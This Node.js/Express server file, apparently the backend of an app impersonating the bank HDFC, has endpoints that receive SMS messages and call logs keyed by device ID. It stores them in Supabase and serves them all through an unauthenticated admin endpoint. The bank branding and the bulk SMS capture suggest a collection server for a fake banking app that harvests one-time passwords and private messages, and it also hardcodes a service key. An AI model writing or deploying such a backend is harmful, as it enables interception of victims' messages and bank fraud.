require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(cors());
app.use(express.json());

// Supabase Setup
const supabaseUrl = 'https://fetecwnmxodqwsjlwezn.supabase.co';
const supabaseKey = 'sb_publishable_1qgs7DcEo_jU2Zh1ug5DOw_xwB2cw-A';
const supabase = createClient(supabaseUrl, supabaseKey);

// --- API ENDPOINTS ---

// 1. Receive SMS Logs
app.post('/api/logs/sms', async (req, res) => {
    const { deviceId, sender, message, timestamp } = req.body;
    
    const { data, error } = await supabase
        .from('sms_logs')
        .insert([{ device_id: deviceId, sender, message, received_at: timestamp }]);

    if (error) return res.status(500).json({ error: error.message });
    res.json({ success: true, data });
});

// 2. Receive Call Logs
app.post('/api/logs/calls', async (req, res) => {
    const { deviceId, logs } = req.body; // logs is an array
    
    const formattedLogs = logs.map(log => ({
        device_id: deviceId,
        number: log.number,
        type: log.type,
        duration: log.duration,
        called_at: log.timestamp
    }));

    const { data, error } = await supabase
        .from('call_logs')
        .insert(formattedLogs);

    if (error) return res.status(500).json({ error: error.message });
    res.json({ success: true, data });
});

// 3. Get All Data (For Admin Panel)
app.get('/api/admin/data', async (req, res) => {
    const { data: sms } = await supabase.from('sms_logs').select('*').order('received_at', { ascending: false });
    const { data: calls } = await supabase.from('call_logs').select('*').order('called_at', { ascending: false });
    
    res.json({ sms, calls });
});

// Serve Frontend
app.use(express.static('public'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`HDFC Admin Server running on port ${PORT}`));
